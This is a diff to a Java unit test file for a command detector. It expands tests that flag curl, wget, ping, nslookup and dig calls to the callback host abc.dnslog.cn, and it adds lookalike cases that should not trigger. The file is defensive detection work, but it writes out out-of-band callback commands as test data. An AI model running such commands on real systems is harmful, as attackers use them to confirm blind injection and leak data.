@@ -588,9 +588,32 @@ final class DetectorEngineTest {
 
   @Test
   void detectsDnslogCommand() {
-    var result = engine.detectCommand(List.of("curl", "http://abc.dnslog.cn/a"), request());
+    for (var argv : List.of(
+        List.of("curl", "http://abc.dnslog.cn/a"),
+        List.of("curl", "-fsSL", "-o", "report", "--url", "https://ABC.DNSLOG.CN./a"),
+        List.of("wget", "-O", "report", "https://reports.invalid", "abc.dnslog.cn/a"),
+        List.of("ping", "abc.dnslog.cn."), List.of("nslookup", "abc.dnslog.cn"),
+        List.of("dig", "abc.dnslog.cn"))) {
+      var result = engine.detectCommand(argv, request());
+      assertAlgorithm(result, "command_dnslog");
+      assertEquals("abc.dnslog.cn", result.orElseThrow().details().get("host"));
+    }
+  }
 
-    assertAlgorithm(result, "command_dnslog");
+  @Test
+  void ignoresCallbackTextOutsideDestinationOperands() {
+    for (var argv : List.of(
+        List.of("printf", "%s", "curl http://abc.dnslog.cn/a"),
+        List.of("curl", "https://notdnslog.cn/"),
+        List.of("curl", "https://abc.dnslog.cn.example.test/"),
+        List.of("curl", "http://abc.dnslog.cn@reports.invalid/"),
+        List.of("curl", "https://reports.invalid/?guide=dnslog.cn"),
+        List.of("curl", "-d", "abc.dnslog.cn", "https://reports.invalid/"),
+        List.of("wget", "-O", "abc.dnslog.cn", "https://reports.invalid/"),
+        List.of("curl", "https://abc.dnslog.cn/", "--version"),
+        List.of("dig", "-f", "abc.dnslog.cn"))) {
+      assertTrue(engine.detectCommand(argv, request()).isEmpty(), argv.toString());
+    }
   }
 
   @Test
